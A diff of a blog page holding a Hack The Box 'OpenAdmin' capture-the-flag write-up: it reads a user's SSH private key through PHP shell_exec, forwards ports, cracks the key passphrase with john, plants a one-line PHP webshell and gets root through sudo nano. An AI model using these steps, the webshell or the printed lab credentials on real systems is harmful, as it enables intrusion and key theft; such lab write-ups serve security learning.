+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "&lt;pre&gt;$output&lt;/pre&gt;";
+?&gt;
+&lt;html&gt;
+&lt;h3&gt;Don't forget your "ninja" password&lt;/h3&gt;
+Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;Session
+&lt;/html&gt;
+</code></pre>
+<p>The private key would be printed whether we are logged in or not! We would just be redirected to <code>index.php</code> if we are not logged in. Therefore, we can just curl <code>main.php</code> to get the private key, no username or password needed.</p>
+<p><img alt="" src="/images/htb_openadmin/internal_curlpriv.png"/></p>
+<p>So, what if we want to access the internal website from a web browser on our machine? <code>Local Port Forwarding</code> is the answer.</p>
+<p>The command to do <code>Local Port Forwarding</code> is <code>ssh -L local_port:destination_ip:destination_port username@ssh_server_ip</code>.</p>
+<p>As we already know the credential of <code>jimmy</code> (username), we can use <code>ssh</code> to forward the connection from a port on our machine, such as <code>80</code> (local_port), through the ssh server on <code>10.10.10.171</code> (ssh_server_ip), to the destination host at <code>127.0.0.1</code> (destination_ip) on port <code>52846</code> (destination_port). This means that the ssh server host would forward the connection to itself, allowing us to connect to a locally hosted web server.</p>
+<p>The command is <code>ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/internal_localforward.png"/></p>
+<p>With the port forwarding done. we can now use the web browser to connect to port <code>80</code> on our machine to reach the web server.</p>
+<p><img alt="" src="/images/htb_openadmin/internal_localhost.png"/></p>
+<p>Logging in with <code>jimmy:Revealed</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/internal_login.png"/></p>
+<p>As planned, we now have the private key of <code>joanna</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/internal_privkey.png"/></p>
+<p>I copied the private key into a file name <code>privkey</code>. We can use the key to <code>ssh</code> to the target with the user <code>joanna</code> using the command <code>ssh -i privkey joanna@10.10.10.171</code> … or not?</p>
+<p>The private key is protected with a passphrase!</p>
+<p><img alt="" src="/images/htb_openadmin/joanna_pass.png"/></p>
+<p>But what is the passphrase? Let’s try cracking it using <code>john</code> and our beloved wordlist, <code>rockyou.txt</code>.</p>
+<p>We can convert the private key into the format usable by <code>john</code> with the command <code>python /usr/share/jogn/ssh2john.py privkey &gt; privkey.hash</code>, then crack it using the command <code>john privkey.hash --wordlist=/usr/share/wordlists/rockyou.txt</code>.</p>
+<p>And the result? Success!</p>
+<p><img alt="" src="/images/htb_openadmin/internal_privkey_crack.png"/></p>
+<p>We can <em>finally</em> <code>ssh</code> to the target using the private key and the passphrase <code>bloodninjas</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/joanna_ssh.png"/></p>
+<h3 id="another-solution">Another Solution</h3>
+<p>There’s another method to access <code>joanna</code>. If we go back, we can see that <code>jimmy</code> own the <code>/var/www/internal</code> directory and all the files inside, so we can edit the existing files, or write new files there.</p>
+<p><img alt="" src="/images/htb_openadmin/internal.png"/></p>
+<p>We can create a simple command execution webshell named <code>cmd.php</code> in the directory using <code>echo '&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;' &gt; cmd.php</code>. Then we can <code>curl</code> to the page with our command in <code>cmd</code> parameter using <code>curl localhost:52846/cmd.php?cmd=[COMMAND]</code> to run arbitrary commands as <code>joanna</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/internal_joannacmd.png"/></p>
+<p>We can use this method to get the private key, or put our public key inside <code>/home/joanna/.ssh/authorized_keys</code> to gain access to the machine.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>The escalation steps for this box is quite straightforward. Using <code>sudo -l</code>, we can see that <code>nano</code> can be run as <code>root</code> without password needed.</p>
+<p><img alt="" src="/images/htb_openadmin/joanna_nano.png"/></p>
+<p>With the information from <a href="https://gtfobins.github.io/gtfobins/nano/">https://gtfobins.github.io/gtfobins/nano/</a>, it’s clear that <code>sudo</code> with <code>nano</code> is a <code>nono</code>, allowing a low-privilege user to escalate to <code>root</code> easily.</p>
+<p><img alt="" src="/images/htb_openadmin/gtfobins.png"/></p>
+<p>Running <code>nano</code> with elevated permission.</p>
+<p><img alt="" src="/images/htb_openadmin/priv1.png"/></p>
+<p>Pressing <code>Ctrl-R</code>, then <code>Ctrl-X</code> to execute command.</p>
+<p><img alt="" src="/images/htb_openadmin/priv2.png"/></p>
+<p>Type <code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code>, then press <code>Enter</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/priv3.png"/></p>
+<p>Tap <code>Enter</code> a few times to clear the screen, and here we go, rooted!</p>
+<p><img alt="" src="/images/htb_openadmin/root.png"/></p>
 <div class="blog-tags">
 <a href="https://erbazz.github.io/tags/writeup/">writeup</a> 
             
@@ -310,7 +387,7 @@ if (!doNotTrack) {
 <ul>
 <li><a href="/writeup/htb_openadmin_th/">[Writeup] Hack The Box :: OpenAdmin (Thai Version)</a></li>
 <li><a href="/writeup/htb_craft/">[Writeup] Hack The Box :: Craft</a></li>
-<li><a href="/writeup/rop_02_oraclesplan/">[Writeup] ROP: 02 - Oracle's Plan</a></li>
+<li><a href="/writeup/rop_05_guessingword/">[Writeup] ROP: 05 - Guessing Word</a></li>
 </ul>
 </article>
 <ul class="pager blog-pager">
@@ -396,87 +473,5 @@ if (!doNotTrack) {
     s.parentNode.insertBefore(gcse, s);
   })();
 </script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script><script>
-const _do_decrypt = function(encrypted, password) {
-  let key = CryptoJS.enc.Utf8.parse(password);
-  let iv = CryptoJS.enc.Utf8.parse(password.substr(16));
-
-  let decrypted_data = CryptoJS.AES.decrypt(encrypted, key, {
-    iv: iv,
-    mode: CryptoJS.mode.CBC,
-    padding: CryptoJS.pad.Pkcs7
-  });
-  return decrypted_data.toString(CryptoJS.enc.Utf8);
-};
-
-const _click_handler = function(element) {
-  let parent = element.parentNode.parentNode;
-  let encrypted = parent.querySelector(
-    ".hugo-encryptor-cipher-text").innerText;
-  let password = parent.querySelector(
-    ".hugo-encryptor-input").value;
-  password = CryptoJS.MD5(password).toString();
-
-  let index = -1;
-  let elements = document.querySelectorAll(
-    ".hugo-encryptor-container");
-  for (index = 0; index < elements.length; ++index) {
-    if (elements[index].isSameNode(parent)) {
-      break;
-    }
-  }
-
-  let decrypted = "";
-  try {
-    decrypted = _do_decrypt(encrypted, password);
-  } catch (err) {
-    console.error(err);
-    alert("Failed to decrypt.");
-    return;
-  }
-
-  if (!decrypted.includes("--- DON'T MODIFY THIS LINE ---")) {
-    alert("Incorrect password.");
-    return;
-  }
-
-  let storage = localStorage;
-
-  let key = location.pathname + ".password." + index;
-  storage.setItem(key, password);
-  parent.innerHTML = decrypted;
-}
-
-var input = document.getElementById("hash-input");
-
-input.addEventListener("keyup", function(event) {
-  if (event.keyCode === 13) {
-    document.getElementById("decrypt-button").click();
-  }
-});
-
-window.onload = () => {
-  let index = -1;
-  let elements = document.querySelectorAll(
-    ".hugo-encryptor-container");
-
-  while (1) {
-    ++index;
-
-    let key = location.pathname + ".password." + index;
-    let password = localStorage.getItem(key);
-
-    if (!password) {
-      break;
-
-    } else {
-      console.log("Found password for part " + index);
-
-      let parent = elements[index];
-      let encrypted = parent.querySelector(".hugo-encryptor-cipher-text").innerText;
-      let decrypted = _do_decrypt(encrypted, password);
-      elements[index].innerHTML = decrypted;
-    }
-  }
-};</script></body>
+</body>
 </html>
